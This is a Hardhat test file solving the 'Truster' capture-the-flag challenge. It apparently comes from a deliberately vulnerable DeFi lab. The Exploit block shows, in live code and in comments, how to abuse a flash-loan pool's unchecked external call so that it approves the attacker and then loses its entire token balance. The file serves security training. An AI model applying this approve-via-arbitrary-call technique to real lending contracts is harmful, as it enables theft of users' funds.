const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Truster', function () {
    let deployer, attacker;

    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const DamnValuableToken = await ethers.getContractFactory('DamnValuableToken', deployer);
        const TrusterLenderPool = await ethers.getContractFactory('TrusterLenderPool', deployer);

        this.token = await DamnValuableToken.deploy();
        this.pool = await TrusterLenderPool.deploy(this.token.address);

        await this.token.transfer(this.pool.address, TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal(TOKENS_IN_POOL);

        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal('0');
    });

    it('Exploit', async function () {
        /*
        TrusterLenderPool blindly calls whatever contract we pass in
        So we just have it approve for us to take, then we take it
        */
        // Solution in more than one transaction
        // const approveI = new ethers.utils.Interface(["function approve(address sender, uint256 amount) bool"])
        // const data = approveI.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL])
        // await this.pool.connect(attacker).flashLoan(0, attacker.address, this.token.address, data)
        // // If deployed in a contract, this could be done in one transaction
        // await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL)

        // Solution in one transaction
        const attackerContractFactory = await ethers.getContractFactory('TrusterAttacker', attacker);
        const attackerContract = await attackerContractFactory.deploy();
        await attackerContract.connect(attacker).attack(this.pool.address, this.token.address);
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.equal(TOKENS_IN_POOL);
        expect(
            await this.token.balanceOf(this.pool.address)
        ).to.equal('0');
    });
});

